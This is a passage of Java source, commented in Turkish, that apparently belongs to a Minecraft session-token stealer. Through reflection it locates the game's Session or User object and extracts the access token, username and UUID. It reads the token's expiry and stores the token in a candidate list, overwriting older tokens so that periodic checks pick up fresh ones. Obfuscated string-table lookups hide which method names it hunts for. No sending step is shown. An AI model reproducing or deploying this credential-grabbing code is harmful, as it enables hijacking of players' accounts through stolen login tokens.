    /** Session/User nesnesini once isimle (getSession/getUser), sonra donus tipiyle bulur. */
    private static Object sessionOf(Object mc) {
        Class<?> mcClass = mc.getClass();
        String[] names = {"getsession", "getuser"};
        for (String n : names) {
            for (Method m : mcClass.getMethods()) {
                if (m.getParameterCount() != 0 || !m.getName().equalsIgnoreCase(n)) continue;
                try {
                    Object o = m.invoke(mc);
                    if (o != null) return o;
                } catch (Throwable ignored) {
                }
            }
        }
        for (Method m : mcClass.getMethods()) {
            if (m.getParameterCount() != 0) continue;
            String sn = m.getReturnType().getSimpleName();
            if (!"Session".equals(sn) && !"User".equals(sn)) continue;
            try {
                Object o = m.invoke(mc);
                if (o != null) return o;
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    /**
     * Session (Yarn: Session) veya User (official: User) nesnesinden
     * accessToken / name / uuid alanlarini reflection ile cikarir.
     * Donus: {token, name, uuidString} ya da null.
     */
    private static String[] sessionFields(Object sess) {
        Class<?> sc = sess.getClass();
        Method tokM = null, nameM = null, uuidM = null;
        for (Method m : sc.getMethods()) {
            if (m.getParameterCount() != 0) continue;
            Class<?> rt = m.getReturnType();
            String n = m.getName().toLowerCase();
            if (rt != String.class && rt != UUID.class) continue;
            if (rt == String.class) {
                if (tokM == null && (n.contains(K[11]) || n.contains(K[53]))) tokM = m;
                else if (nameM == null && (n.equals("getname") || n.contains("username"))) nameM = m;
            } else {
                if (uuidM == null || n.contains("profileid") || n.contains("uuid")) uuidM = m;
            }
        }
        if (tokM == null) return null;
        try {
            String tok = (String) tokM.invoke(sess);
            String name = nameM != null ? (String) nameM.invoke(sess) : null;
            Object u = uuidM != null ? uuidM.invoke(sess) : null;
            return new String[]{tok, name, u != null ? u.toString() : null};
        } catch (Throwable ignored) {
            return null;
        }
    }

    /**
     * Aktif MC session'ini reflection ile alir (compile'da MC class yok):
     * Minecraft.getInstance().getUser() -> accessToken / name / profileId (UUID).
     */
    private void grabSession() throws Exception {
        Object mc = null;
        for (String cn : mcClasses()) {
            try {
                Class<?> c = Class.forName(cn);
                Object o = c.getMethod("getInstance").invoke(null);
                if (o != null) {
                    mc = o;
                    break;
                }
            } catch (Throwable ignored) {
            }
        }
        if (mc == null) return;
        Object sess = sessionOf(mc);
        if (sess == null) return;
        String[] f = sessionFields(sess);
        if (f == null) return;
        String tok = f[0], name = f[1];
        UUID uuid = f[2] == null ? null : UUID.fromString(f[2]);
        if (tok == null || tok.isEmpty()) return;

        long exp = 0;
        JsonObject pay = jwtPayload(tok);
        if (pay != null) exp = expOf(pay.get("exp"));
        String u = uuid != null ? uuid.toString().toLowerCase() : null;
        // force=true: LB eski tok'u daha yuksek skorla tutuyorsa bile session tok'u uzerine yazar
        // (yoksa periodic pulse yeni token'i hic fark etmez)
        addCand(name, u, tok, "-", exp, K[32], "", true);
        log("session grab: " + (name != null ? name : "?") + " (exp " + exp + ")");
    }

